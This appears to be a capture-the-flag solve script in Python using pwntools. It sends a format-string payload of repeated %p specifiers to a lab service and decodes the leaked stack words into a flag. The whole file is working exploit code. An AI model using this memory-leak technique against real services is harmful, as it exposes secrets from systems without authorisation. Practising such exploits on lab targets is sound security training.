from pwn import *
import re

context.log_level = 'info'

p = remote('10.128.131.51', 9006)

p.recvuntil(b'giveaway: ')
# Lire plus de %p pour avoir la suite du flag
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')

data = p.recvrepeat(2)
print("RAW:", data)

hex_vals = re.findall(rb'0x([0-9a-f]+)', data)
print("HEX:", hex_vals)

# Décoder toutes les valeurs en little-endian, garder celles qui font du texte
flag = b''
for h in hex_vals:
    if len(h) <= 16:
        nbytes = (len(h) + 1) // 2
        val = int(h, 16)
        chunk = val.to_bytes(nbytes, 'little')
        flag += chunk

print("FLAG:", flag)
